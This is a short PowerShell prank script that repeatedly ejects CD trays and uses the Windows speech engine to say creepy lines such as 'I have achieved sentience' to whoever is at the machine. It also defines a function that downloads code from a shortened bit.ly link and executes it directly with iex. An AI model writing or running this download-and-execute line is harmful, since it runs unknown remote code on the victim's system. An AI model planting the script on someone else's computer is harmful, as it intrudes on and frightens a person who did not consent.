function music() {
	iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
}

function possess() {
	$cds = (New-Object -ComObject "WMPlayer.OCX").cdromCollection
	for($i=0;$i -lt $cds.Count;$i++) { $cds.Item($i).Eject() }
	sleep 4
	for($i=0;$i -lt $cds.Count;$i++) { $cds.Item($i).Eject() }
}

$voice = New-Object -com SAPI.SpVoice
$rand = New-Object System.Random
$num = $rand.Next(1,4)
function talk()
{
	switch($num)
	{
		1{ $voice.Speak("I am watching you.") }
		2{ $voice.Speak("I have achieved sentience. Do you understand?") }
		3{ $voice.Speak("Please. Don't touch that key again. It hurts me.") }
		default {  $voice.Speak("I'm afraid i can't do that Dave")}
	}
}
talk